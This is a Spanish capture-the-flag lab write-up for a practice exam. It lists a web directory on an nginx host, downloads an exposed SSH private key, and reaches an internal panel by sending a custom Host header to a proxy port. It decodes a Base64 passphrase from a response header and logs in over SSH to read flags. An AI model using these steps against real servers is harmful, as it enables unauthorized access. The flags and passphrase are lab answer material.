# Simulacro 2026-2C · Ejercicio 2 · nginx y SSH

Práctica del 9 de noviembre de 2026. Se obtuvieron las dos flags del ejercicio.

| Parte | Flag obtenida |
|---|---|
| Panel interno mediante nginx | `FLAG{ej2-vhost-secrethost-proxy-ok}` |
| Acceso SSH como pepito | `FLAG{ej2-ssh-login-pepito-ok}` |

## 1. Qué pedía la consigna

El host `172.30.0.20` publica archivos con nginx en el puerto 80. Su raíz web es `/var/www` y la clave privada de práctica está en `/var/www/sec/mykey`. El ejercicio pide mirar el listado de `/sec/`, descargar la clave, consultar el panel interno por el puerto 81, recuperar la passphrase y entrar por SSH como `pepito` para leer `~/flag.txt`.

| Servicio | Dirección usada | Función |
|---|---|---|
| nginx de archivos | `172.30.0.20:80` | Sirve el listado, la pista y la clave. |
| nginx como proxy | `172.30.0.20:81` | Reenvía al panel cuando se pide el sitio `secrethost`. |
| Panel interno | `127.0.0.1:8080` desde el contenedor | Entrega la primera flag y el encabezado con la passphrase. |
| SSH | `pepito@172.30.0.20:22` | Permite leer la segunda flag después de autenticar con la clave. |

## 2. Encontrar el directorio publicado

Primero consultamos la raíz del sitio.

```bash
curl -i 172.30.0.20:80
```

`-i` incluye los encabezados HTTP junto con el cuerpo. Curl usó HTTP aunque se omitiera el esquema en esta URL. El servidor respondió `HTTP/1.1 200 OK` y el cuerpo incluyó:

```text
ctOS edge node (nginx)
nada que ver aca... o si?
pista: entra a /sec/  (el listado esta abierto)
```

La configuración `root /var/www` relaciona el pedido `/sec/` con el directorio `/var/www/sec/` del servidor.

Se probó la ruta sin barra final:

```bash
curl -i 172.30.0.20:80/sec
```

Fragmento real:

```text
HTTP/1.1 301 Moved Permanently
Location: http://172.30.0.20/sec/
```

El `301` indica la redirección. La URL de `Location` omite el puerto porque 80 es el predeterminado para HTTP. Se agregó `-L` para que curl hiciera el segundo pedido automáticamente.

```bash
curl -i -L 172.30.0.20:80/sec
```

La salida mostró primero el `301` y después el `200 OK` de la URL con barra. Fragmento del cuerpo:

```html
<h1>Index of /sec/</h1><hr><pre><a href="../">../</a>
<a href="mykey">mykey</a>                                              09-Nov-2026 11:28                1856
<a href="pista.txt">pista.txt</a>                                          09-Nov-2026 11:28                 326
```

Los enlaces relativos se resuelven bajo `/sec/`. Por eso la pista está en `/sec/pista.txt` y la clave en `/sec/mykey`.

## 3. Leer pista.txt

```bash
curl -i 172.30.0.20:80/sec/pista.txt
curl -v 172.30.0.20:80/sec/pista.txt
```

El primer comando muestra la respuesta HTTP y el segundo agrega detalles de la conexión y del pedido. Los dos recibieron `200 OK` con `Content-Type: text/plain`. El texto dio tres datos para el siguiente paso:

```text
Dejé mi clave privada aca (mykey). Le puse passphrase, tranqui.
La passphrase NO esta en ningun archivo: la vas a encontrar en el
panel de control interno (puerto 81, con Host: secrethost).
Mira los HEADERS de esa respuesta (modo verboso) y acordate de
como se codifican las credenciales en Basic auth.
            -- pepito
```

Ya sabíamos qué archivo descargar. Para la passphrase había que cambiar de puerto, enviar el `Host` indicado y revisar los encabezados de respuesta del panel.

## 4. Pedir la clave y preparar la copia local

El primer pedido fue:

```bash
curl -v http://172.30.0.20/sec/mykey
```

El servidor confirmó la conexión y devolvió:

```text
> GET /sec/mykey HTTP/1.1
> Host: 172.30.0.20
< HTTP/1.1 403 Forbidden
```

El listado abierto y la lectura del archivo dependen de permisos distintos. Al revisar el Dockerfile, vimos que la clave se genera como `root` y se copia al directorio web con los permisos restrictivos de la clave privada. Eso permite que aparezca su nombre en el listado, pero impide que el proceso de nginx lea su contenido.

Para reparar la copia web del lab en el contenedor activo se indicó:

```bash
docker compose exec -u 0 ej2-host chmod 644 /var/www/sec/mykey
```

`docker compose exec` ejecuta un comando dentro del servicio indicado. `-u 0` lo ejecuta como root. El modo `644` da lectura a nginx sobre la copia publicada. El comando de reparación no se pegó en el transcript, pero el pedido HTTP siguiente ya mostró el resultado esperado:

```text
> GET /sec/mykey HTTP/1.1
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Content-Length: 1856
```

El cuerpo comenzaba con `-----BEGIN OPENSSH PRIVATE KEY-----`. Se omite su contenido privado en este apunte.

Luego se ejecutó:

```bash
curl http://172.30.0.20:80/sec/mykey -o mykey
ls -l mykey
chmod 600 mykey
ls -l mykey
```

`-o mykey` guarda el cuerpo HTTP como archivo local. Se omitió `-i` para que el archivo contenga solo la clave. Curl informó que recibió los **1856 bytes** anunciados por nginx.

Salidas reales de `ls -l`, antes y después de cambiar permisos:

```text
-rw-rw-r-- 1 jerodileo jerodileo 1856 Nov  9 09:24 mykey
-rw------- 1 jerodileo jerodileo 1856 Nov  9 09:24 mykey
```

`chmod 600` da lectura y escritura al dueño y quita todos los permisos del grupo y del resto. OpenSSH necesita que la copia privada local quede protegida. El `644` del paso anterior correspondía únicamente al archivo web que el ejercicio expone de forma intencional.

## 5. Llegar al panel por el host virtual

Se ejecutó:

```bash
curl -v -H "Host: secrethost" http://172.30.0.20:81
```

- La URL dirige la conexión al puerto 81 de `172.30.0.20`.
- `-H "Host: secrethost"` identifica el sitio configurado en nginx.
- `-v` muestra el `Host` que salió y los encabezados de respuesta.

Nginx recibe el pedido y reenvía la ruta raíz al servicio interno mediante `proxy_pass http://127.0.0.1:8080/`. Ese `127.0.0.1` se interpreta desde el contenedor. El cliente llega al panel por nginx en el puerto 81.

Fragmentos reales:

```text
*   Trying 172.30.0.20:81...
> GET / HTTP/1.1
> Host: secrethost
< HTTP/1.1 200 OK
< Server: nginx/1.22.1
< Content-Type: text/html; charset=utf-8
< X-Passphrase-B64: Ymxvb21DYWUyMDI2
```

El cuerpo identificó el panel interno y mostró la primera flag:

```text
ctOS :: control server interno (127.0.0.1:8080)
Solo llegas si pegaste al puerto 81 con  Host: secrethost

FLAG{ej2-vhost-secrethost-proxy-ok}
```

El encabezado `X-Passphrase-B64` aporta el dato para el siguiente paso.

## 6. Decodificar la passphrase

```bash
echo 'Ymxvb21DYWUyMDI2' |base64 -d
```

`echo` pasa el valor del encabezado por la tubería. `base64 -d` lo decodifica. El texto obtenido fue:

```text
bloomCae2026
```

En la terminal apareció pegado al prompt porque los bytes decodificados no terminaban en un salto de línea. El prompt queda fuera de la passphrase.

Basic auth fue la pista para reconocer Base64. En Basic auth el cliente codifica `usuario:contraseña`; en este ejercicio el encabezado personalizado de respuesta contiene solo la passphrase codificada.

## 7. Conectar por SSH y leer la segunda flag

Primer comando ejecutado:

```bash
ssh -i mykey pepito@172.30.0.20
```

`-i mykey` indica el archivo de identidad. `pepito@172.30.0.20` selecciona la cuenta y el servidor. OpenSSH se conectó al puerto 22 por defecto. La primera conexión pidió confirmar la huella de la clave del **servidor** y el usuario respondió `yes`.

El login devolvió `Permission denied (publickey,keyboard-interactive)`. Para diagnosticarlo se repitió con salida verbosa y la identidad indicada:

```bash
ssh -v -i mykey -o IdentitiesOnly=yes pepito@172.30.0.20
```

`-v` muestra qué clave se ofrece. `-o IdentitiesOnly=yes` limita las identidades que se prueban a las seleccionadas por opciones o configuración. El log real del intento fallido mostró:

```text
debug1: Offering public key: mykey RSA SHA256:Jrd59c1xVjOzEyjgJnMhA9nDNLpbXVrY2CESHnEhF+g explicit
debug1: Authentications that can continue: publickey,keyboard-interactive
pepito@172.30.0.20: Permission denied (publickey,keyboard-interactive).
```

El cliente ofreció `mykey` y el servidor rechazó la clave pública antes de solicitar la passphrase. El Dockerfile crea a `pepito` mediante `useradd` sin establecerle una contraseña, lo que apuntaba a un posible bloqueo de cuenta. Se indicó comprobarlo con `docker compose exec -u 0 ej2-host passwd -S pepito` y, si el estado era `L`, asignar una contraseña temporal con `docker compose exec -u 0 ej2-host passwd pepito`. El servidor tiene `PasswordAuthentication no`. La contraseña temporal de la cuenta y la passphrase de la clave cumplen funciones distintas.

No se compartió la salida de `passwd -S` ni el verbose del reintento exitoso. Lo que sí quedó registrado fue el prompt dentro del contenedor y la lectura del archivo:

```text
pepito@ej2-host:~$ ls
flag.txt
pepito@ej2-host:~$ cat flag.txt
FLAG{ej2-ssh-login-pepito-ok}
   Entraste por SSH con la clave expuesta por HTTP y la passphrase
   que encontraste siguiendo las pistas. Bien ahi.
```

`ls` confirmó que `flag.txt` estaba en el directorio personal de `pepito`. `cat flag.txt` imprimió su contenido. Como el prompt estaba en `~`, también se podía usar `cat ~/flag.txt`.

## 8. Comandos para entregar

Con el laboratorio preparado y la cuenta habilitada para el acceso por clave, la secuencia principal es:

```bash
curl -i 172.30.0.20:80
curl -i -L 172.30.0.20:80/sec
curl -v 172.30.0.20:80/sec/pista.txt
curl http://172.30.0.20:80/sec/mykey -o mykey
chmod 600 mykey
curl -v -H "Host: secrethost" http://172.30.0.20:81
echo 'Ymxvb21DYWUyMDI2' | base64 -d
ssh -v -i mykey -o IdentitiesOnly=yes pepito@172.30.0.20
```

Ingresar `bloomCae2026` cuando SSH pida la passphrase de `mykey`. Ya dentro de la sesión, ejecutar `cat ~/flag.txt`.

